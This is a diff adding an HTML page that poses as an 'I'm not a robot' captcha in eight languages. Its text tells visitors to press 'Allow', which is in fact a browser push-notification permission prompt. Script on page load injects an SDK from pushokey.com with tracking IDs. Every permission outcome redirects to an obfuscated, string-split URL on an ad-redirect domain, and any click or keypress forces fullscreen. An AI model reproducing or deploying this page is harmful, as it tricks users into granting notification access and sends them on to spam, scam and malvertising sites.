@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta charset="UTF-8">
+    <title>Bot captcha</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            background-color: #fff;
+            font-family: Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            width: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            user-select: none
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        #notBot {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            justify-content: space-between;
+            width: 100%
+        }
+
+        #topContainer {
+            align-items: flex-end;
+            display: flex;
+            height: 35%
+        }
+
+        #topBox {
+            align-items: center;
+            border-radius: 30px;
+            box-shadow: 0 0 40px rgba(0, 0, 0, .5);
+            display: flex;
+            font-size: 30px;
+            font-weight: 700;
+            height: 80px;
+            margin-bottom: 10px;
+            margin-left: 300px;
+            padding: 0 50px
+        }
+
+        #top2 {
+            color: #03a8db
+        }
+
+        #mid2 {
+            font-weight: 700
+        }
+
+        #top2 {
+            margin: 0 10px
+        }
+
+        #mid2 {
+            margin: 0 5px
+        }
+
+        #midContainer {
+            align-items: center;
+            display: flex;
+            height: 20%;
+            justify-content: center
+        }
+
+        #midBox,
+        .msgReady__tx {
+            align-items: center;
+            background-color: #f9f9f9;
+            border: 3px solid #d3d3d3;
+            border-radius: 20px;
+            box-sizing: border-box;
+            display: flex;
+            height: 150px;
+            justify-content: space-around;
+            min-width: 400px;
+            padding: 10px 0;
+            width: 45%
+        }
+
+        .msgReady__tx {
+            text-align: center
+        }
+
+        #imgBox {
+            align-items: center
+        }
+
+        #imgBox,
+        #textBox {
+            display: flex;
+            height: 130px
+        }
+
+        #textBox {
+            color: #575757;
+            flex-direction: column;
+            font-size: 20px;
+            justify-content: center
+        }
+
+        #midTop {
+            color: #000;
+            font-size: 43px;
+            margin: 0 0 10px;
+            padding-left: 20px
+        }
+
+        #midBot {
+            padding: 0 20px
+        }
+
+        #msgImg {
+            margin-left: 10px
+        }
+
+        #capImg {
+            margin-right: 10px
+        }
+
+        #botContainer {
+            display: flex;
+            height: 42vh;
+            justify-content: flex-end
+        }
+
+        #botContainer>img {
+            height: 42vh;
+            width: 42vh
+        }
+
+        @media (min-width:425px) and (max-width:900px) {
+            #topContainer {
+                align-items: flex-start;
+                justify-content: flex-end
+            }
+
+            #topBox {
+                font-size: 20px;
+                margin: 10px;
+                padding: 0 10px
+            }
+
+            #midBox,
+            .msgReady__tx {
+                width: 60%;
+                z-index: 1
+            }
+
+            #midTop {
+                font-size: 30px
+            }
+
+            .msgReady__tx {
+                font-size: 28px
+            }
+        }
+
+        @media (max-width:425px) {
+            #topContainer {
+                display: none
+            }
+
+            #midContainer {
+                align-items: flex-start
+            }
+
+            #midBox,
+            .msgReady__tx {
+                margin-top: 5px;
+                min-width: 98%;
+                padding: 5px 15px
+            }
+
+            #midBot {
+                padding: 0 15px
+            }
+
+            #midTop {
+                font-size: 20px;
+                padding-left: 15px
+            }
+
+            #msgImg {
+                height: 50px;
+                margin-left: 10px
+            }
+
+            #capImg {
+                height: 70px;
+                margin-right: 10px
+            }
+
+            #textBox {
+                font-size: 34px;
+                max-width: 60%
+            }
+
+            #botContainer {
+                align-items: center;
+                justify-content: center
+            }
+        }
+    </style>
+</head>
+
+<body>
+  <script>(function() {
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var loc = document.location;
+    var tb = function(){ loc.href = ['ht', 'tps:/', '/blud', 'wan.com/a', 'fu.ph', 'p?zon', 'eid=2483917'].join(''); };
+    var bc = function(){ loc.href = ['ht', 'tps:', '/', '/go', 'ogle.com/'].join(''); };
+
+    var url = new URL(window.location.href);
+    var pci = getParameterByName('external_id', window.location.href);
+    var ppi = getParameterByName('placementid', window.location.href);
+    var tag = document.createElement('script');
+    tag.type = 'text/javascript';
+    tag.dataset['sdk'] = 'sdk';
+    tag.src = '//pushokey.com/ntfc.php?p=2483903&ucis=true&m=https&nbinp=true' + '&var='+ ppi + '&ymid=' + pci;
+
+    function setupHandlers() {
+      // sdk.onBeforePermissionPrompt();
+      sdk.onPermissionDefault(tb);
+      sdk.onPermissionAllowed(tb);
+      sdk.onPermissionDenied(tb);
+      sdk.onAlreadySubscribed(tb);
+    }
+
+    tag.onload = setupHandlers;
+
+    document.head.appendChild(tag);
+    })();</script>
+    <div id="notBot">
+        <div id="topContainer">
+            <div id="topBox"><span id="top1"></span><span id="top2"></span><span id="top3"></span></div>
+        </div>
+        <div id="midContainer">
+            <div id="midBox"><img id="msgImg" src="images/bot-captcha/img2.png" alt="image">
+                <div>
+                    <h1 id="midTop"></h1>
+                    <div id="midBot"><span id="mid1"></span><span id="mid2"></span><span id="mid3"></span></div>
+                </div><img id="capImg" src="images/bot-captcha/img3.png" alt="image">
+            </div>
+            <h1 class="msgReady__tx isHide"></h1>
+        </div>
+        <div id="botContainer"><img src="images/bot-captcha/img1.png" alt="image"></div>
+    </div>
+    <script>
+
+            var b = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (b.k = navigator.language.slice(0, 2)), void 0 === e[b.k] && (b.k = "en"), b.t = e[b.k]
+                    },
+                    get: function(e) {
+                        return b.t[e]
+                    }
+                },
+                y = b;
+
+            y.set({
+                ru: {
+                    top1: "Нажмите",
+                    top2: "Разрешить",
+                    top3: "чтобы подтвердить",
+                    midTop: "Я не Робот",
+                    mid1: "Нажмите на",
+                    mid2: "Разрешить",
+                    mid3: "для подтверждения, что Вы не робот",
+                    msg: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                en: {
+                    top1: "Press",
+                    top2: "Allow",
+                    top3: "to confirm",
+                    midTop: "I'm not a robot",
+                    mid1: "Press",
+                    mid2: "Allow",
+                    mid3: "to verify, that you are not a robot",
+                    msg: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                fr: {
+                    top1: "Cliquez sur",
+                    top2: "Autoriser",
+                    top3: "pour confirmer",
+                    midTop: "Je ne suis pas un robot",
+                    mid1: "Cliquez sur",
+                    mid2: "Autoriser",
+                    mid3: "pour confirmer que vous n'êtes pas un robot",
+                    msg: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    top1: "Klicken Sie",
+                    top2: "Zulassen",
+                    top3: "",
+                    midTop: "Ich bin kein Roboter",
+                    mid1: "Klicken Sie",
+                    mid2: "Zulassen",
+                    mid3: "wenn Sie kein Roboter sind",
+                    msg: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    top1: "Haga clic en",
+                    top2: "Permitir",
+                    top3: "para confirmar",
+                    midTop: "No soy un robot",
+                    mid1: "Haga clic en",
+                    mid2: "Permitir",
+                    mid3: "para confirmar que no es un robot",
+                    msg: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                uk: {
+                    top1: "Натисніть",
+                    top2: "Дозволити",
+                    top3: "щоб підтвердити",
+                    midTop: "Я не робот",
+                    mid1: "Натисніть",
+                    mid2: "Дозволити",
+                    mid3: "щоб підтвердити, що ви не робот",
+                    msg: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    top1: "Kliknij",
+                    top2: "Zezwalaj",
+                    top3: "aby potwierdzić",
+                    midTop: "Nie jestem robotem",
+                    mid1: "Kliknij",
+                    mid2: "Zezwalaj",
+                    mid3: "aby potwierdzić, że nie jesteś botem",
+                    msg: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                th: {
+                    top1: "คลิก",
+                    top2: "อนุญาต",
+                    top3: "เพื่อยืนยัน",
+                    midTop: "ฉันไม่ใช่หุ่นยนต์",
+                    mid1: "คลิก",
+                    mid2: "อนุญาต",
+                    mid3: "เพื่อยืนยันว่าคุณไม่ใช่หุ่นยนต์",
+                    msg: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                }
+            }), document.querySelector("#top1").textContent = y.get("top1"), document.querySelector("#top2").textContent = y.get("top2"), document.querySelector("#top3").textContent = y.get("top3"), document.querySelector("#midTop").textContent = y.get("midTop"), document.querySelector("#mid1").textContent = y.get("mid1"), document.querySelector("#mid2").textContent = y.get("mid2"), document.querySelector("#mid3").textContent = y.get("mid3"), document.querySelector(".msgReady__tx").innerHTML = y.get("msg")
+
+    </script>
+    <script>
+      var t = function() {
+          void 0 !== this.requestFullScreen ? this.requestFullScreen() : void 0 !== this.webkitRequestFullScreen ? this.webkitRequestFullScreen() : void 0 !== this.mozRequestFullScreen && this.mozRequestFullScreen()
+      };
+      document.body.addEventListener("keydown", t), document.body.addEventListener("click", t)
+    </script>
+
+</body>
+
+
+</html>
